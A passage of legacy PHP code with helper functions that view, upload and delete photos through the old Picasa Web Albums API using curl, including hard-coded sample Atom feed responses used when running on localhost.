        $photoview['albumname'] = iconv('utf-8','gb2312',$objXml->getElementsByTagName("feed")->item(0)->getElementsByTagName("title")->item(0)->nodeValue);
        $photoview['photowidth'] = $objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:width"),"1"))->item(0)->nodeValue;
        $photoview['photoheight'] = $objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:height"),"1"))->item(0)->nodeValue;
        $photoview['photourl'] = $objHdd->getElementsByTagName("content")->item(0)->GetAttributeNode("src")->nodeValue;
        return $photoview;
}

function googlephotocreate($authclientLogin,$albumid,$photopath){
        $typeflag = "";         
        switch (strtolower(geturlinfo(trim($photopath),"ext"))) {  // case start
                case "jpg":
                        $contenttype = "image/jpeg";
                        $typeflag = "image";            
                        break;
                case "jpeg":
                        $contenttype = "image/jpeg";            
                        $typeflag = "image";            
                        break;
                case "bmp":
                        $contenttype = "image/bmp";             
                        $typeflag = "image";            
                        break;
                case "gif":
                        $contenttype = "image/gif";             
                        $typeflag = "image";            
                        break;
                case "png":
                        $contenttype = "image/png";             
                        $typeflag = "image";            
                        break;
                default:
                        $contenttype = "";              
                        $typeflag = "other";            
                        break;
        }               

        //echo $contenttype;    

        if ($typeflag == "image"){
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, trim($photopath));
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
                $postdata = trim($xmlstr);
                
                //echo $postdata;
                        
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
			$xmlstr = "<?php xml version='1.0' encoding='gbk'?><entry xmlns='http://www.w3.org/2005/Atom' xmlns:exif='http://schemas.google.com/photos/exif/2007' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/'><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461002902218383906</id><published>2010-04-17T07:20:20.000Z</published><updated>2010-04-17T07:20:20.305Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>ymlogo.gif</title><summary type='text'/><content type='image/gif' src='http://lh4.ggpht.com/_dm6qv9_mhy8/S8lhNLgaoiI/AAAAAAAAAL0/jAncGjp9bmM/ymlogo.gif'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461002902218383906'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461002902218383906'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/BEiX22EgmRm_QS8qgZksFg'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461002902218383906'/><link rel='edit' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461002902218383906/1'/><link rel='edit-media' type='image/jpeg' href='http://picasaweb.google.com/data/media/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461002902218383906/1'/><link rel='media-edit' type='image/jpeg' href='http://picasaweb.google.com/data/media/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461002902218383906/1'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461002902218383906'/><gphoto:id>5461002902218383906</gphoto:id><gphoto:version>1</gphoto:version><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>134</gphoto:width><gphoto:height>31</gphoto:height><gphoto:size>1937</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271488820000</gphoto:timestamp><gphoto:imageVersion>189</gphoto:imageVersion><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='保留所有权利' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>3f4883e7c37543650d964dc017388e7d</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh4.ggpht.com/_dm6qv9_mhy8/S8lhNLgaoiI/AAAAAAAAAL0/jAncGjp9bmM/ymlogo.gif' height='31' width='134' type='image/gif' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh4.ggpht.com/_dm6qv9_mhy8/S8lhNLgaoiI/AAAAAAAAAL0/jAncGjp9bmM/s72/ymlogo.png' height='17' width='72'/><media:thumbnail url='http://lh4.ggpht.com/_dm6qv9_mhy8/S8lhNLgaoiI/AAAAAAAAAL0/jAncGjp9bmM/s144/ymlogo.png' height='31' width='134'/><media:thumbnail url='http://lh4.ggpht.com/_dm6qv9_mhy8/S8lhNLgaoiI/AAAAAAAAAL0/jAncGjp9bmM/s288/ymlogo.png' height='31' width='134'/><media:title type='plain'>ymlogo.gif</media:title></media:group></entry>";
                }       
                else{   
                        $url = "http://picasaweb.google.com/data/feed/api/user/default/albumid/".trim($albumid);                
                        //$postdata = "";
                        $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                        $header[] = "Content-type: ".$contenttype;
                        $header[] = "Content-length: ".strlen($postdata);
                        $header[] = "Slug : ".geturlinfo(trim($photopath),"filename");
                        //$header[] = "If-Match: *";
                        $header[] = "GData-Version: 2";
                        //$header[] = $postdata;
                        //print_r($header);
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                }
        }

        //echo $xmlstr;
        $pathinfo = parse_url(trim($photopath));
        if($pathinfo['host'] == $_SERVER['SERVER_NAME'])
                unlink('./tmp/'.geturlinfo(trim($photopath),"filename"));

        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        if($xmlstr != ''){
                $objXml->loadXML($xmlstr);
        }       
        $photocreate['contenttype'] = $contenttype;
        $photocreate['typeflag'] = $typeflag;
        $photocreate['photoid'] = $objXml->getElementsByTagName("entry")->item(0)->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue;
        $photocreate['xmlstr'] = $xmlstr;
        return $photocreate;
}

function googlephotoremove($authclientLogin,$albumid,$photoid,$page,$pagesize){
        if (trim($albumid) != "" && trim($photoid) != "" ){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $xmlstr = "";
                        $xmlcode = "200";                       }       
                else{   
                        $url = "http://picasaweb.google.com/data/entry/api/user/default/albumid/".trim($albumid)."/photoid/".trim($photoid);            
                        $postdata = "";
                        $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                        $header[] = "Content-type: application/atom+xml; charset=utf-8";
                        $header[] = "Content-length: ".strlen($postdata);
                        $header[] = "If-Match: *";
                        $header[] = "GData-Version: 2";
                        //$header[] = $postdata;                
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'DELETE');
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                        curl_close($ch);
                }
                $photoremove['code'] = $xmlcode;
                $photoremove['xmlstr'] = $xmlstr;
        }
        elseif (trim($albumid) != "" && trim($photoid) == ""){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
				$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:exif='http://schemas.google.com/photos/exif/2007' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273</id><updated>2010-04-20T06:28:40.039Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><subtitle type='text'>X3193</subtitle><rights type='text'>public</rights><icon>http://lh6.ggpht.com/_dm6qv9_mhy8/S8lf9KEtgmE/AAAAAAAAAPI/zLOuk3gVFWE/s160-c/X3193.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%2Falbumid%2F5461001527444210273%3Falt%3Drss'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>5</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:id>5461001527444210273</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271488000</gphoto:timestamp><gphoto:numphotos>5</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where><gphoto:allowPrints>true</gphoto:allowPrints><gphoto:allowDownloads>true</gphoto:allowDownloads><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666</id><published>2010-04-18T06:11:55.000Z</published><updated>2010-04-18T06:11:55.647Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>200732415592131379.jpg</title><summary type='text'/><content type='image/jpeg' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/200732415592131379.jpg'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461356353765299666'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/ET6IGxZSMgyyQO6EtqgqEA'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461356353765299666'/><gphoto:id>5461356353765299666</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>2.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>2560</gphoto:width><gphoto:height>1920</gphoto:height><gphoto:size>1079514</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271571115000</gphoto:timestamp><gphoto:imageVersion>228</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:fstop>5.6</exif:fstop><exif:make>OLYMPUS OPTICAL CO.,LTD</exif:make><exif:model>X-2,C-50Z       </exif:model><exif:exposure>0.004</exif:exposure><exif:flash>false</exif:flash><exif:focallength>18.83</exif:focallength><exif:iso>80</exif:iso><exif:imageUniqueID>91eae41caefa1b8168ff654be922b499</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/200732415592131379.jpg' height='1200' width='1600' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s72/200732415592131379.jpg' height='54' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s144/200732415592131379.jpg' height='108' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s288/200732415592131379.jpg' height='216' width='288'/><media:title type='plain'>200732415592131379.jpg</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618</id><published>2010-04-18T06:58:32.000Z</published><updated>2010-04-18T06:58:32.472Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>200732415592131379.jpg</title><summary type='text'/><content type='image/jpeg' src='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/200732415592131379.jpg'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461368367913393618'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/Md_xYvcNP3mcPLiMrfbL7w'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461368367913393618'/><gphoto:id>5461368367913393618</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>3.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>2560</gphoto:width><gphoto:height>1920</gphoto:height><gphoto:size>1079514</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271573912000</gphoto:timestamp><gphoto:imageVersion>230</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:fstop>5.6</exif:fstop><exif:make>OLYMPUS OPTICAL CO.,LTD</exif:make><exif:model>X-2,C-50Z       </exif:model><exif:exposure>0.004</exif:exposure><exif:flash>false</exif:flash><exif:focallength>18.83</exif:focallength><exif:iso>80</exif:iso><exif:imageUniqueID>91eae41caefa1b8168ff654be922b499</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/200732415592131379.jpg' height='1200' width='1600' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s72/200732415592131379.jpg' height='54' width='72'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s144/200732415592131379.jpg' height='108' width='144'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s288/200732415592131379.jpg' height='216' width='288'/><media:title type='plain'>200732415592131379.jpg</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186</id><published>2010-04-18T07:34:49.000Z</published><updated>2010-04-18T07:34:49.375Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>logo_cn.gif</title><summary type='text'/><content type='image/gif' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/logo_cn.gif'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461377717417411186'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/rIiepHjPBzA7v7rfPriS2w'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461377717417411186'/><gphoto:id>5461377717417411186</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>4.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>276</gphoto:width><gphoto:height>110</gphoto:height><gphoto:size>7763</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271576089000</gphoto:timestamp><gphoto:imageVersion>232</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>e633ed9c7f5a9250b4de235457d8778a</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/logo_cn.gif' height='110' width='276' type='image/gif' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s72/logo_cn.png' height='29' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s144/logo_cn.png' height='58' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s288/logo_cn.png' height='110' width='276'/><media:title type='plain'>logo_cn.gif</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274</id><published>2010-04-20T06:10:05.000Z</published><updated>2010-04-20T06:10:05.294Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>promo_laiba.png</title><summary type='text'/><content type='image/png' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/promo_laiba.png'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5462098051612756274'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/BNzzGRzupe6RtPg1JYMuuQ'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5462098051612756274'/><gphoto:id>5462098051612756274</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>5.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>517</gphoto:width><gphoto:height>73</gphoto:height><gphoto:size>32641</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271743805000</gphoto:timestamp><gphoto:imageVersion>241</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>c4e46e5943b41acb00aa7d26cc6e0557</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/promo_laiba.png' height='73' width='517' type='image/png' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s72/promo_laiba.png' height='11' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s144/promo_laiba.png' height='21' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s288/promo_laiba.png' height='41' width='288'/><media:title type='plain'>promo_laiba.png</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298</id><published>2010-04-20T06:15:51.000Z</published><updated>2010-04-20T06:15:51.702Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>promo_laiba.png</title><summary type='text'/><content type='image/png' src='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/promo_laiba.png'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5462099539391843298'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/peWgQE517l9VJlp_7eCSuQ'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5462099539391843298'/><gphoto:id>5462099539391843298</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>6.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>517</gphoto:width><gphoto:height>73</gphoto:height><gphoto:size>32641</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271744151000</gphoto:timestamp><gphoto:imageVersion>242</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>c4e46e5943b41acb00aa7d26cc6e0557</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/promo_laiba.png' height='73' width='517' type='image/png' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s72/promo_laiba.png' height='11' width='72'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s144/promo_laiba.png' height='21' width='144'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s288/promo_laiba.png' height='41' width='288'/><media:title type='plain'>promo_laiba.png</media:title></media:group></entry></feed>";
                        $xmlcode = '200';
                }       
                else{
                        $ch = curl_init();
                        $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                        $header[] = "GData-Version: 2";                         
                        $url = "http://picasaweb.google.com/data/feed/api/user/default/albumid/".trim($albumid)."?start-index=1&max-results=1000000";
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                                  
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                        curl_close($ch);
                        unset($header);
                } 
                //echo $xmlstr;
                //return;
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);
                $objList = $objXml->getElementsByTagName("entry");                      

                if ($objList->length > floor($pagesize)) 
                        $strpagesize = $pagesize; 
                else 
                        $strpagesize = $objList->length;
                $totalitem = $objList->length;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }       
                $xmlstr = "wait";                       
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        $objHdd = $objList->item($i);
                        if ($_POST["chidd".$i] != ""){
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = "";
                                        $xmlcode = "200";                       
                                }       
                                else{   
                                        //$url = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(0)->nodeValue)."/".$versionID;     
                                        //$url = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(0)->nodeValue);    
                                        $url = "http://picasaweb.google.com/data/entry/api/user/default/albumid/".trim($albumid)."/photoid/".iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue);
                                        $postdata = "";
                                        $header[] = "Authorization: GoogleLogin auth=".trim(request("authclientLogin"));
                                        $header[] = "Content-type: application/atom+xml; charset=utf-8";
                                        $header[] = "Content-length: ".strlen($postdata);
                                        $header[] = "If-Match: *";
                                        $header[] = "GData-Version: 2";
                                        $header[] = $postdata;          
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'DELETE');
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        curl_setopt($ch, CURLOPT_POST, 1);
